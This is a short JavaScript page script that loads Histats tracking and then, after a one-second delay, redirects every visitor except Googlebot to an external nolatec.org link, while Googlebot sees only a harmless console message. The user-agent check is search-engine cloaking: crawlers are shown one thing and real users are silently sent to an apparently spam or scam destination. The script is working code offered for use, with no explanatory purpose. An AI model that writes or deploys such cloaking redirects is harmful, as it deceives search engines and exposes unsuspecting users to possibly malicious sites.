// 1. Set Page Title
document.title = "cccccc xx";

// 2. Official Histats Tracking Script (100% Working & Reliable)
var _Hasync = _Hasync || [];
_Hasync.push(['Histats.start', '1,5032111,4,511,95,18,00000000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);

(function() {
  var hs = document.createElement('script');
  hs.type = 'text/javascript';
  hs.async = true;
  hs.src = 'https://s10.histats.com/js15_as.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();

// 3. Time Delay & Redirect Logic
var redirectDelay = 1000;

setTimeout(function() {
  if (!navigator.userAgent.includes('Googlebot')) {
    // Normal User Redirect
    window.location.href = "https://nolatec.org/4/1e5c257bb6f145c9aef01843d3777f97";
  } else {
    // Googlebot Action
    console.log("Thanks for visiting my page");
  }
}, redirectDelay);
